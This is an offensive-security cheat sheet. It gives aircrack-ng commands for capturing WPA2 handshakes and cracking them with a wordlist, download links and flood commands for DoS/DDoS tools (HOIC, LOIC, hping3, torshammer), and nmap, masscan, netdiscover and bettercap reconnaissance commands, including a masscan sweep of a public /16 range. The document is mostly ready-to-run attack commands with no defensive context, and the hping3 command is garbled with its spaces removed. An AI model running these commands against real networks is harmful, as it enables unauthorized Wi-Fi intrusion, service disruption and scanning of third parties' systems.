# Handshake

A wireless handshake, also known as a four-way handshake, is the 
process of establishing a secure connection between a wireless 
access point (AP) and a client device on a wireless network

▪ The most common method for cracking WPA2-PSK is through an offline brute-force attack, which involves trying every possible password combination until the correct one is found
▪ The one requirement before engaging with such attacks, is 
capturing a valid handshake from present client on the network

The tools we will mainly use from Aircrack-ng bundles are:
▪ airodump-ng for analyzing the networks and capturing handshakes
▪ aireplay-ng for performing deauthentication attacks
▪ aircrack-ng for cracking the password with the handshake


Enter the following command to start capturing packets for the target network:
▪ sudo airodump-ng --bssid <target_BSSID> --channel <target_channel> --write <output_file> wlan0mon
▪ aircrack-ng -w <wordlist_file> <handshake_file>

# DoS and DDoS

▪ HOIC (High Orbit Ion Cannon) is a free and open-source tool used for stress testing websites and networks. 
Download at: https://sourceforge.net/projects/highorbitioncannon/ 
▪ LOIC (Low Orbit Ion Cannon) is an open-source network stress testing tool used to perform denial-of-service (DoS) attacks. 
Download at: https://sourceforge.net/projects/loic/
▪ hping3 is a free, open-source tool used for network testing, security auditing, and packet crafting. hping3 is capable of sending a large number of packets to a target system, and it can be used to test the resilience of a network against various types of attacks, including denial-of-service (DoS) attacks.

```sh
sudohping3-S--flood-V-p IP_ADDRESS
```

▪ torshammer.py is a script written in Python that can be used to perform a distributed denial-of-service (DDoS) attack.
https://github.com/Karlheinzniebuhr/torshammer 

```sh
python torshammer.py -t 192.168.1.100 -r 100000 -T
```


##  Network Reconnaissance with Nmap
nmap -p 80 --script http-generator.nse
nmap -p 443 --script=http-headers,http-title,http-generator 
nmap --script="default and http-*" 

##  Network Reconnaissance with Masscan
[Cheatsheet Masscan/](https://cheatsheet.haax.fr/network/port-scanning/masscan_cheatsheet/)
```sh
masscan -p80,443,8080,8443,81,4444,4443,8888 70.176.0.0/16
```
##  Network Reconnaissance with Netdiscover
```sh
netdiscover
```
## Network Reconnaissance with Bettercap
```sh
sudo bettercap
```